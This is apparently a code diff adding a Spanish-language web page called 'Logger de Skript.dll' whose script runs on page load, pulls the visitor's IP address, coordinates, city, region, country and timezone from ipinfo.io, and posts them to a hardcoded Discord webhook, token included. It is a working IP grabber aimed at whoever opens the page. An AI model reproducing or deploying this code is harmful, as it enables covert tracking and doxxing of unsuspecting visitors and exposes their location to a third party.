@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Logger de Skript.dll</title>
+    <link rel="stylesheet" type="text/css" href="style.css"> <!-- Si tienes un archivo CSS personalizado -->
+    <style>
+        body {
+            background-color: #000; /* Cambia el color de fondo a oscuro (#000) */
+            color: #ff0000; /* Cambia el color del texto a blanco (#fff) */
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Bienvenido al Logger de Skript.dll</h1>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="https://discord.gg/fseT6VyKMM">Communty</a></li>
+            <li><a href="">Acerca de</a></li>
+            <li><a href="">Contacto</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <h2>Contenido Principal</h2>
+        <!-- Aquí puedes agregar tu contenido principal, como texto, imágenes y otros elementos HTML -->
+    </main>
+
+    <div id="log-area"> <!-- Div donde se mostrarán los caracteres cambiantes -->
+        <p></p>
+    </div>
+
+    <div id="ip-info" style="display: none;">
+        <!-- Aquí se mostrará la información de IP -->
+        <h1> Skript.dll:</h1>
+    </div>
+
+    <footer>
+        <p>Your IP address was successfully logged by Skript.dll</p>
+    </footer>
+
+    <script src="script.js"></script> <!-- Si tienes un archivo JavaScript personalizado -->
+    <script>
+        // Función para obtener la información de IP y enviarla a Discord
+        function getIpInfo() {
+            fetch('https://ipinfo.io/json')
+                .then(response => response.json())
+                .then(data => {
+                    // Obtener la información
+                    const {
+                        ip,
+                        org,
+                        loc,
+                        timezone,
+                        city,
+                        region,
+                        country
+                    } = data;
+
+                    // Crear un objeto embed con la información de IP y la miniatura de la imagen
+                    const embedData = {
+                        title: 'Datos de IP',
+                        color: 16711680, // Color hexadecimal (en este caso, rojo)
+                        fields: [
+                            {
+                                name: 'IP:',
+                                value: ip
+                            },
+                            {
+                                name: 'Status:',
+                                value: org
+                            },
+                            {
+                                name: 'Delay:', // Puedes calcular un valor de "delay" si lo deseas
+                                value: ''
+                            },
+                            {
+                                name: 'Continente:', // Puedes obtener el continente si es relevante para ti
+                                value: ''
+                            },
+                            {
+                                name: 'Latitud:',
+                                value: loc.split(',')[0]
+                            },
+                            {
+                                name: 'Longitud:',
+                                value: loc.split(',')[1]
+                            },
+                            {
+                                name: 'Zona horaria:',
+                                value: timezone
+                            },
+                            {
+                                name: 'Ciudad:',
+                                value: city
+                            },
+                            {
+                                name: 'Región:',
+                                value: region
+                            },
+                            {
+                                name: 'País:',
+                                value: country
+                            }
+                        ],
+                        thumbnail: {
+                            url: 'https://imgs.search.brave.com/MdB_1OBy-MRHbz7RUJLZv-A3yphJXWTUvAmva_X-q2c/rs:fit:860:0:0/g:ce/aHR0cHM6Ly9jZG4u/aWNvbi1pY29ucy5j/b20vaWNvbnMyLzQ5/MS9QTkcvNTEyL3dp/bmRvdy1wcm9ncmFt/bWluZ180NzgzMi5w/bmc', // Cambia 'URL_DE_TU_IMAGEN_AQUI' por la URL de tu imagen
+                            height: 50, // Altura en píxeles
+                            width: 50 // Anchura en píxeles
+                        }
+                    };
+
+                    // Mostrar la información en la página
+                    const ipInfoElement = document.getElementById('ip-info');
+                    ipInfoElement.style.display = 'block';
+
+                    // Llamar a la función para enviar la IP al webhook de Discord con el objeto embed
+                    sendIpInfoToDiscord(embedData);
+                })
+                .catch(error => {
+                    console.error('Error al obtener la información de IP:', error);
+                });
+        }
+
+        // Función para enviar la IP al webhook de Discord con un objeto embed
+        function sendIpInfoToDiscord(embedData) {
+            // URL de tu webhook de Discord (asegúrate de que esté actualizada)
+            const webhookUrl = 'https://discord.com/api/webhooks/1149739167736144033/LcAqTOMYuCRhOWsS4LV8naoyKZTfOZOoao6xoMQty_4VI4cc7e-iSxcPAXX4y_GAMoTl';
+
+            // Datos para enviar al webhook en formato de embed
+            const data = {
+                embeds: [embedData]
+            };
+
+            // Configurar la solicitud al webhook
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Datos de IP enviados al webhook de Discord.');
+                } else {
+                    console.error('Error al enviar los datos de IP al webhook de Discord.');
+                }
+            })
+            .catch(error => {
+                console.error('Error al enviar los datos de IP al webhook de Discord:', error);
+            });
+        }
+
+        // Llama a la función al cargar la página
+        window.addEventListener('load', getIpInfo);
+    </script>
+</body>
+</html>
